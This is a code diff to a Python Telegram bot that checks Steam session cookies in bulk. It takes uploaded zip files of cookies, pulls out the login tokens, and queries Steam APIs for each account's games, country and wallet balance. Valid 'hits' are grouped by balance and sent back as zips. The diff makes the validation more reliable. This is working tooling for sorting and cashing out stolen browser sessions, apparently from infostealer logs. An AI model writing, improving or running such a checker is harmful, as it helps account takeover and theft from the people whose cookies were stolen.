@@ -22,7 +22,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ------------------------------------------------------------
-# Original SteamChecker code (modified for memory & validation)
+# Original SteamChecker code (modified for reliable validation)
 # ------------------------------------------------------------
 
 G = "\033[92m"
@@ -157,13 +157,6 @@ def format_cookies_json(cookies):
 
 # ========== ENHANCED COOKIE LOADER ==========
 def load_cookies(filepath):
-    """
-    Load cookies from a file. Supports:
-    - JSON array of cookie objects
-    - JSON object with a 'cookies' or 'data' list
-    - Netscape format (tab-separated, starting with domain)
-    - Mixed text files that contain Netscape lines among other text
-    """
     try:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read().strip()
@@ -214,7 +207,7 @@ def load_cookies(filepath):
     except:
         pass
 
-    # Try to find Netscape-style cookie lines (tab-separated, at least 7 fields)
+    # Try Netscape-style lines
     lines = content.splitlines()
     cookie_lines = []
     for line in lines:
@@ -223,13 +216,10 @@ def load_cookies(filepath):
             continue
         parts = line.split('\t')
         if len(parts) >= 7:
-            # Check if first part looks like a domain (contains a dot or is 'localhost')
             domain = parts[0]
             if '.' in domain or domain == 'localhost':
                 cookie_lines.append(line)
-        # Also check if line contains "steamLoginSecure" or "steamRefresh_steam" as a name
         elif 'steamLoginSecure' in line or 'steamRefresh_steam' in line:
-            # Might be a cookie line but with different separators? Try splitting by tabs anyway
             parts = line.split('\t')
             if len(parts) >= 7:
                 cookie_lines.append(line)
@@ -252,11 +242,10 @@ def load_cookies(filepath):
                 })
         if cookies:
             return cookies
-
     return None
 
 # ------------------------------------------------------------
-# SteamChecker class with memory‑efficient validation
+# SteamChecker class with fallback validation
 # ------------------------------------------------------------
 class SteamChecker:
     def __init__(self, cookie_data, cookie_file_path, index):
@@ -337,7 +326,6 @@ class SteamChecker:
                     return str(level)
         except:
             pass
-
         try:
             resp = self.session.get(
                 f"https://steamcommunity.com/profiles/{sid_int}",
@@ -358,26 +346,156 @@ class SteamChecker:
     def check(self):
         self.steamid = self.extract_steamid()
         self.token = self.extract_token()
-
         if not self.steamid or not self.token:
             return False
 
         self.session.cookies.set('Steam_Language', 'english')
         sid_int = int(self.steamid)
 
-        # Track if any API call succeeded
-        any_api_success = False
-
+        # ---- Step 1: Try to load the profile page (most reliable check) ----
+        profile_ok = False
         try:
-            # 1. Get username (optional)
-            self.username = self.get_username_from_profile(sid_int)
-            if not self.username:
-                self.username = self.steamid[:8]
+            resp = self.session.get(
+                f"https://steamcommunity.com/profiles/{sid_int}",
+                timeout=10,
+                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            )
+            if resp.status_code == 200:
+                profile_ok = True
+                # Extract username and level from profile if possible
+                title_match = re.search(r'<title>(.*?)</title>', resp.text)
+                if title_match:
+                    title = title_match.group(1)
+                    if 'Steam Community :: ' in title:
+                        self.username = title.replace('Steam Community :: ', '').strip()
+                    elif 'Steam 社区 :: ' in title:
+                        self.username = title.replace('Steam 社区 :: ', '').strip()
+                    else:
+                        self.username = title.strip()
+                # Try to get level from the page
+                level_match = re.search(r'level\s*(\d+)', resp.text, re.I)
+                if level_match:
+                    self.level = level_match.group(1)
+                else:
+                    # fallback to miniprofile API
+                    try:
+                        mpid = sid_int - 76561197960265728
+                        resp2 = self.session.get(
+                            f"https://steamcommunity.com/miniprofile/{mpid}/json",
+                            timeout=10,
+                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+                        )
+                        if resp2.status_code == 200:
+                            data = resp2.json()
+                            level = data.get("level", data.get("player_level", ""))
+                            if level:
+                                self.level = str(level)
+                    except:
+                        pass
+        except:
+            pass
 
-            # 2. Get level (optional)
-            self.level = self.get_level(sid_int)
+        # If profile page loaded, we already have a valid cookie
+        if profile_ok:
+            # Try to get additional info from APIs (optional)
+            try:
+                # Get country
+                cpb = struct.pack('<BQ', 0x09, sid_int)
+                resp = self.session.post(
+                    f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
+                    f"?access_token={self.token}",
+                    data=brn_mp("input_protobuf_encoded", base64.b64encode(cpb).decode()),
+                    headers={"Content-Type": BARON_CT},
+                    timeout=10
+                )
+                if resp.status_code == 200:
+                    data = baron_pd(resp.content)
+                    cc = data.get(1, b"")
+                    if cc:
+                        if isinstance(cc, bytes):
+                            cc = cc.decode()
+                        self.country = BRN_MAP.get(cc, cc)
 
-            # 3. Get country
+                # Get games
+                gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
+                       baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
+                       baro_pi(9, 1) + baro_pi(10, 1))
+                gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
+                resp = self.session.get(
+                    f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
+                    f"?access_token={self.token}"
+                    f"&input_protobuf_encoded={gb64}",
+                    timeout=10
+                )
+                if resp.status_code == 200:
+                    data = baron_pd(resp.content)
+                    self.total_games = data.get(1, 0)
+                    raw_games = data.get(2, [])
+                    if isinstance(raw_games, bytes):
+                        raw_games = [raw_games]
+                    elif not isinstance(raw_games, list):
+                        raw_games = []
+                    for g in raw_games:
+                        try:
+                            if not isinstance(g, bytes):
+                                continue
+                            gf = baron_pd(g)
+                            name = gf.get(2, b"")
+                            if isinstance(name, bytes):
+                                name = name.decode(errors="replace")
+                            if isinstance(name, str) and name.strip():
+                                self.games.append(name.strip())
+                        except:
+                            continue
+
+                # Get balance
+                resp = self.session.post(
+                    f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
+                    f"?access_token={self.token}",
+                    data=brn_mp("input_protobuf_encoded", "GAE="),
+                    headers={"Content-Type": BARON_CT},
+                    timeout=10
+                )
+                if resp.status_code == 200:
+                    data = baron_pd(resp.content)
+                    bal = data.get(14, b"")
+                    if isinstance(bal, bytes):
+                        bal = bal.decode("utf-8", errors="ignore")
+                    elif isinstance(bal, int):
+                        bal = str(bal)
+                    self.balance_raw = bal
+                    # parse balance
+                    def parse_balance(balance_str, country_code):
+                        currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
+                        symbol = ''
+                        for sym in currency_symbols:
+                            if sym in balance_str:
+                                symbol = sym
+                                break
+                        if not symbol and country_code in CURRENCY_MAP:
+                            symbol = CURRENCY_MAP[country_code]
+                        cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
+                        if ',' in cleaned and '.' not in cleaned:
+                            cleaned = cleaned.replace(',', '.')
+                        parts = cleaned.split('.')
+                        if len(parts) > 2:
+                            cleaned = parts[0] + '.' + ''.join(parts[1:])
+                        try:
+                            value = float(cleaned)
+                        except:
+                            value = 0.0
+                        return value, symbol
+                    self.balance_float, self.currency = parse_balance(bal, self.country)
+            except:
+                pass
+
+            self.success = True
+            return True
+
+        # ---- If profile failed, try the APIs as fallback ----
+        any_api_success = False
+        try:
+            # Country
             cpb = struct.pack('<BQ', 0x09, sid_int)
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
@@ -393,14 +511,13 @@ class SteamChecker:
                     if isinstance(cc, bytes):
                         cc = cc.decode()
                     self.country = BRN_MAP.get(cc, cc)
-                    any_api_success = True  # Country API succeeded
+                    any_api_success = True
 
-            # 4. Get games
+            # Games
             gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
                    baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                    baro_pi(9, 1) + baro_pi(10, 1))
             gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
-
             resp = self.session.get(
                 f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                 f"?access_token={self.token}"
@@ -429,7 +546,7 @@ class SteamChecker:
                     except:
                         continue
 
-            # 5. Get balance
+            # Balance
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                 f"?access_token={self.token}",
@@ -446,7 +563,6 @@ class SteamChecker:
                     bal = str(bal)
                 self.balance_raw = bal
                 any_api_success = True
-                # parse balance
                 def parse_balance(balance_str, country_code):
                     currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
                     symbol = ''
@@ -469,8 +585,18 @@ class SteamChecker:
                     return value, symbol
                 self.balance_float, self.currency = parse_balance(bal, self.country)
 
-            # If at least one API call succeeded, mark as valid
+            # If any API succeeded, we consider it valid
             if any_api_success:
+                # Try to get username from profile (optional)
+                try:
+                    username = self.get_username_from_profile(sid_int)
+                    if username:
+                        self.username = username
+                except:
+                    pass
+                if not self.username:
+                    self.username = self.steamid[:8]
+                self.level = self.get_level(sid_int)
                 self.success = True
                 return True
             else:
@@ -540,7 +666,6 @@ def run_flask():
     flask_app.run(host="0.0.0.0", port=port)
 
 def group_hits_by_balance(hits):
-    """hits is a list of (balance_float, username, steamid, content)"""
     groups = {"0-1": [], "1-5": [], "5-10": [], "10-200": [], "others": []}
     for bal, username, steamid, content in hits:
         if bal <= 1:
@@ -567,7 +692,6 @@ def create_zip_from_hits(hits, range_name):
     zip_buffer.seek(0)
     return zip_buffer
 
-# Progress tracker class
 class ProgressTracker:
     def __init__(self, total):
         self.total = total
@@ -577,9 +701,8 @@ class ProgressTracker:
         self.lock = Lock()
         self.done = False
 
-# Processing function with batch processing to reduce memory
 def process_cookies_with_progress(cookie_list, tracker, batch_size=200):
-    valid_hits = []  # store (balance_float, username, steamid, content)
+    valid_hits = []
     total_cookies = len(cookie_list)
 
     for start in range(0, total_cookies, batch_size):
@@ -600,18 +723,15 @@ def process_cookies_with_progress(cookie_list, tracker, batch_size=200):
                     else:
                         tracker.invalid += 1
 
-        # Collect valid hits from this batch
         for checker in checkers:
             if checker.success:
                 content = generate_hit_content(checker)
                 valid_hits.append((checker.balance_float, checker.username, checker.steamid, content))
-        # Free memory
         del checkers
 
     tracker.done = True
     return valid_hits
 
-# Bot handlers
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
     if not document or not document.file_name.endswith('.zip'):
@@ -662,10 +782,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tracker = ProgressTracker(total)
         loop = asyncio.get_running_loop()
 
-        # Start processing in thread with batch
         processing_future = loop.run_in_executor(None, process_cookies_with_progress, all_cookies, tracker, 200)
 
-        # Updater task with duplicate prevention
         last_text = ""
         async def status_updater():
             nonlocal last_text
@@ -682,7 +800,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     except Exception:
                         pass
                 await asyncio.sleep(1)
-            # final update
             with tracker.lock:
                 processed = tracker.processed
                 valid = tracker.valid
@@ -694,10 +811,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception:
                     pass
 
-        # Run both concurrently
         await asyncio.gather(processing_future, status_updater())
 
-        # Get valid hits (list of tuples)
         valid_hits = processing_future.result()
 
         if not valid_hits:
@@ -745,11 +860,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 def main():
-    # Start Flask in a separate thread
     flask_thread = Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
-    # Set up Telegram bot
     application = Application.builder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
